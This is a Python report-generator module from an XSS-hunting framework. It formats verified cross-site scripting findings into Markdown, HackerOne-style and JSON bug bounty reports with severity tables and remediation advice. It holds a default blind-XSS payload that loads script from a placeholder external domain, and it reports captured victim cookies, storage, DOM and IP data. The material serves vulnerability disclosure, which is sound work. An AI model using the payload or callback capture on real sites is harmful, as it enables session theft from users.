"""
XJutsu v5 - Report Generator
by Dave Lester B. Mondina / ANBU Black Ops Security

Generate bug bounty reports for verified XSS vulnerabilities.
Supports: Markdown, HackerOne format, JSON export
"""

import json
from datetime import datetime
from typing import List, Dict, Optional
from dataclasses import dataclass
from urllib.parse import urlparse

from django.utils import timezone


@dataclass
class VulnerabilityReport:
    """Single vulnerability report"""
    title: str
    severity: str
    cvss_score: float
    url: str
    parameter: str
    method: str
    context: str
    payload: str
    impact: str
    steps_to_reproduce: List[str]
    evidence: Dict
    remediation: str
    discovered_at: datetime
    verified: bool = False


class ReportGenerator:
    """
    Generate formatted reports for bug bounty submissions.

    Supports multiple formats:
    - Markdown (for HackerOne, Bugcrowd)
    - Plain text
    - JSON export
    """

    # CVSS scoring based on context
    SEVERITY_SCORES = {
        'html_text': {'score': 6.1, 'severity': 'Medium', 'type': 'Reflected XSS'},
        'html_attr': {'score': 6.1, 'severity': 'Medium', 'type': 'Reflected XSS'},
        'html_event': {'score': 6.1, 'severity': 'Medium', 'type': 'Reflected XSS'},
        'js_string': {'score': 6.1, 'severity': 'Medium', 'type': 'DOM-based XSS'},
        'js_code': {'score': 6.1, 'severity': 'Medium', 'type': 'DOM-based XSS'},
        'stored': {'score': 8.1, 'severity': 'High', 'type': 'Stored XSS'},
        'blind': {'score': 8.1, 'severity': 'High', 'type': 'Blind XSS'},
    }

    @classmethod
    def get_severity_info(cls, context: str, is_stored: bool = False) -> Dict:
        """Get severity info based on XSS context"""
        if is_stored:
            return cls.SEVERITY_SCORES['stored']
        return cls.SEVERITY_SCORES.get(context, {'score': 6.1, 'severity': 'Medium', 'type': 'Reflected XSS'})

    @classmethod
    def generate_title(cls, domain: str, param: str, xss_type: str) -> str:
        """Generate report title"""
        return f"{xss_type} in {domain} via '{param}' parameter"

    @classmethod
    def generate_impact(cls, context: str, has_cookies: bool = True) -> str:
        """Generate impact description"""
        impacts = []

        if has_cookies:
            impacts.append("Session hijacking through cookie theft")

        impacts.extend([
            "Arbitrary JavaScript execution in victim's browser",
            "Phishing attacks by injecting fake login forms",
            "Keylogging and credential theft",
            "Defacement of the affected page",
            "Malware distribution to users",
        ])

        if context in ('js_string', 'js_code'):
            impacts.append("DOM manipulation and data exfiltration")

        return "\n".join(f"- {impact}" for impact in impacts)

    @classmethod
    def generate_steps(cls, url: str, param: str, method: str, payload: str) -> List[str]:
        """Generate steps to reproduce"""
        parsed = urlparse(url)
        domain = parsed.netloc

        if method.upper() == 'GET':
            poc_url = f"{url}?{param}={payload}" if '?' not in url else f"{url}&{param}={payload}"
            return [
                f"1. Navigate to: `{domain}`",
                f"2. Locate the vulnerable endpoint: `{parsed.path or '/'}`",
                f"3. Inject the following payload in the `{param}` parameter:",
                f"   ```",
                f"   {payload}",
                f"   ```",
                f"4. Full PoC URL:",
                f"   ```",
                f"   {poc_url}",
                f"   ```",
                f"5. Observe that the XSS payload executes in the browser",
            ]
        else:
            return [
                f"1. Navigate to: `{domain}`",
                f"2. Locate the form/endpoint: `{parsed.path or '/'}`",
                f"3. Submit a {method} request with the following payload in the `{param}` field:",
                f"   ```",
                f"   {payload}",
                f"   ```",
                f"4. Observe that the XSS payload executes in the browser",
            ]

    @classmethod
    def generate_remediation(cls) -> str:
        """Generate remediation recommendations"""
        return """
## Remediation

1. **Input Validation**: Validate and sanitize all user input on the server-side
2. **Output Encoding**: Encode output based on context (HTML, JavaScript, URL, CSS)
3. **Content Security Policy**: Implement strict CSP headers to prevent inline script execution
4. **HTTPOnly Cookies**: Set HTTPOnly flag on session cookies to prevent theft via XSS
5. **Use Security Libraries**: Utilize frameworks' built-in XSS protection (React's JSX, Angular's sanitizer)

### Recommended Headers:
```
Content-Security-Policy: default-src 'self'; script-src 'self'
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
```
"""

    @classmethod
    def generate_markdown_report(
        cls,
        capture=None,
        injection_point=None,
        include_evidence: bool = True,
    ) -> str:
        """
        Generate a Markdown report for HackerOne/Bugcrowd submission.

        Args:
            capture: Capture model instance
            injection_point: ScanInjectionPoint model instance
            include_evidence: Include screenshot and DOM evidence
        """
        # Get data from injection point or capture
        if injection_point:
            url = injection_point.url
            param = injection_point.param
            method = injection_point.method
            context = injection_point.context
            payload = injection_point.payload_injected or '<script src=//YOUR-DOMAIN></script>'
            verified = injection_point.is_verified
            discovered_at = injection_point.created_at
            domain = injection_point.domain
        elif capture:
            url = capture.uri
            param = "unknown"
            method = "GET"
            context = "unknown"
            payload = '<script src=//YOUR-DOMAIN></script>'
            verified = True
            discovered_at = capture.fired_at
            domain = capture.domain
        else:
            raise ValueError("Either capture or injection_point required")

        # Get severity info
        severity_info = cls.get_severity_info(context)
        xss_type = severity_info['type']
        severity = severity_info['severity']
        cvss = severity_info['score']

        # Generate title
        title = cls.generate_title(domain, param, xss_type)

        # Generate steps
        steps = cls.generate_steps(url, param, method, payload)

        # Build report
        report = f"""# {title}

## Summary

A **{xss_type}** vulnerability was discovered in `{domain}` that allows an attacker to execute arbitrary JavaScript code in the context of a victim's browser session.

| Field | Value |
|-------|-------|
| **Severity** | {severity} |
| **CVSS Score** | {cvss} |
| **Vulnerability Type** | {xss_type} |
| **Affected URL** | `{url}` |
| **Vulnerable Parameter** | `{param}` |
| **HTTP Method** | {method} |
| **Injection Context** | {context} |
| **Verified** | {'Yes ✅' if verified else 'Pending'} |
| **Discovered** | {discovered_at.strftime('%Y-%m-%d %H:%M UTC') if discovered_at else 'N/A'} |

## Vulnerability Details

The `{param}` parameter does not properly sanitize user input, allowing an attacker to inject malicious JavaScript code that executes when the page is rendered.

### Payload Used:
```html
{payload}
```

## Steps to Reproduce

{chr(10).join(steps)}

## Impact

{cls.generate_impact(context)}

{cls.generate_remediation()}
"""

        # Add evidence if available
        if include_evidence and capture:
            report += f"""
## Evidence

### Callback Received
- **Timestamp**: {capture.fired_at.strftime('%Y-%m-%d %H:%M:%S UTC')}
- **Victim IP**: {capture.ip_address or 'N/A'}
- **User Agent**: `{capture.user_agent[:100]}...` (truncated)
- **Origin**: `{capture.origin}`

### Captured Data
- **Cookies**: {'Yes ✅' if capture.cookies else 'No (HttpOnly)'}
- **LocalStorage**: {'Yes ✅' if capture.localstorage and capture.localstorage != '{}' else 'No'}
- **SessionStorage**: {'Yes ✅' if capture.sessionstorage and capture.sessionstorage != '{}' else 'No'}
- **DOM Captured**: {'Yes ✅' if capture.dom else 'No'}
- **Screenshot**: {'Yes ✅' if capture.screenshot else 'No'}
"""

        report += """
---
*Report generated by XJutsu v5 - XSS Hunter Framework*
"""

        return report

    @classmethod
    def generate_hackerone_format(
        cls,
        capture=None,
        injection_point=None,
    ) -> str:
        """
        Generate HackerOne-optimized report format.
        Shorter, focused on key details.
        """
        if injection_point:
            url = injection_point.url
            param = injection_point.param
            method = injection_point.method
            payload = injection_point.payload_injected or '<script src=//YOUR-DOMAIN></script>'
            domain = injection_point.domain
            context = injection_point.context
        elif capture:
            url = capture.uri
            param = "parameter"
            method = "GET"
            payload = '<script src=//YOUR-DOMAIN></script>'
            domain = capture.domain
            context = "unknown"
        else:
            raise ValueError("Either capture or injection_point required")

        severity_info = cls.get_severity_info(context)

        return f"""## Summary
{severity_info['type']} vulnerability in `{domain}` via the `{param}` parameter allows arbitrary JavaScript execution.

## Severity
**{severity_info['severity']}** (CVSS {severity_info['score']})

## Steps to Reproduce
1. Go to `{url}`
2. Inject payload in `{param}` parameter:
```
{payload}
```
3. XSS executes in browser

## Impact
An attacker can steal session cookies, perform actions on behalf of victims, and compromise user accounts.

## Payload
```html
{payload}
```

## Supporting Material
- XSS callback received confirming execution
- Cookies/session data captured (if applicable)
"""

    @classmethod
    def generate_domain_report(cls, domain: str, captures: list, injection_points: list) -> str:
        """
        Generate a comprehensive report for all findings on a domain.
        """
        report = f"""# XSS Vulnerability Report - {domain}

**Generated**: {datetime.now().strftime('%Y-%m-%d %H:%M UTC')}
**Total Findings**: {len(captures) + len(injection_points)}

---

## Executive Summary

During security testing of `{domain}`, the following Cross-Site Scripting (XSS) vulnerabilities were identified:

| # | Type | URL | Parameter | Severity | Status |
|---|------|-----|-----------|----------|--------|
"""
        # Add injection points
        for i, ip in enumerate(injection_points, 1):
            severity_info = cls.get_severity_info(ip.context)
            status = "✅ Verified" if ip.is_verified else "⏳ Pending"
            short_url = ip.url[:50] + "..." if len(ip.url) > 50 else ip.url
            report += f"| {i} | {severity_info['type']} | `{short_url}` | `{ip.param}` | {severity_info['severity']} | {status} |\n"

        # Add standalone captures
        for i, cap in enumerate(captures, len(injection_points) + 1):
            short_url = cap.uri[:50] + "..." if len(cap.uri) > 50 else cap.uri
            report += f"| {i} | Blind XSS | `{short_url}` | N/A | High | ✅ Verified |\n"

        report += """
---

## Detailed Findings

"""
        # Add detailed findings
        for i, ip in enumerate(injection_points, 1):
            report += f"### Finding #{i}: {ip.param} @ {ip.url[:60]}\n\n"
            report += cls.generate_hackerone_format(injection_point=ip)
            report += "\n---\n\n"

        report += """
## Remediation Summary

1. Implement proper input validation and output encoding
2. Deploy Content Security Policy (CSP) headers
3. Set HttpOnly flag on sensitive cookies
4. Consider using a Web Application Firewall (WAF)

---
*Report generated by XJutsu v5 - XSS Hunter Framework*
*by Dave Lester B. Mondina / ANBU Black Ops Security*
"""

        return report

    @classmethod
    def export_json(cls, captures: list, injection_points: list) -> str:
        """Export findings as JSON for automation"""
        findings = []

        for ip in injection_points:
            severity_info = cls.get_severity_info(ip.context)
            findings.append({
                'id': str(ip.id),
                'type': 'injection_point',
                'url': ip.url,
                'parameter': ip.param,
                'method': ip.method,
                'context': ip.context,
                'severity': severity_info['severity'],
                'cvss': severity_info['score'],
                'xss_type': severity_info['type'],
                'verified': ip.is_verified,
                'payload': ip.payload_injected,
                'discovered_at': ip.created_at.isoformat() if ip.created_at else None,
                'verified_at': ip.verified_at.isoformat() if ip.verified_at else None,
            })

        for cap in captures:
            findings.append({
                'id': str(cap.id),
                'type': 'capture',
                'url': cap.uri,
                'origin': cap.origin,
                'severity': 'High',
                'cvss': 8.1,
                'xss_type': 'Blind XSS',
                'verified': True,
                'has_cookies': bool(cap.cookies),
                'has_screenshot': bool(cap.screenshot),
                'fired_at': cap.fired_at.isoformat() if cap.fired_at else None,
                'ip_address': cap.ip_address,
                'user_agent': cap.user_agent,
            })

        return json.dumps({
            'generated_at': datetime.now().isoformat(),
            'total_findings': len(findings),
            'findings': findings,
        }, indent=2)
